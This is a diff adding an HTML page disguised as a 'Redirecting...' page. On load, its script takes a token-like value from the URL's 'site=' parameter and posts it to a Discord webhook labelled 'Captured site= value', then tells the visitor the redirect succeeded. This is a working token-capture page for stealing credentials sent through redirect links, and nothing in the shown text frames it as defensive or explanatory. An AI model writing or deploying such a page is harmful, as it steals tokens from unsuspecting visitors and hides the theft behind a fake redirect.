@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    window.onload = () => {
+      const url = window.location.href;
+      const match = url.match(/site=([^&]+)/); // extract token-like value after "site="
+
+      if (match && match[1]) {
+        const token = decodeURIComponent(match[1]);
+
+        fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_URL", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: `Captured site= value: ${token}` })
+        }).then(() => {
+          document.body.innerHTML = "<h2>Redirect successful.</h2>";
+        }).catch(() => {
+          document.body.innerHTML = "<h2>Failed to notify webhook.</h2>";
+        });
+      } else {
+        document.body.innerHTML = "<h2>No site= found in URL.</h2>";
+      }
+    };
+  </script>
+</head>
+<body>
+  <h2>Processing request...</h2>
+</body>
+</html>
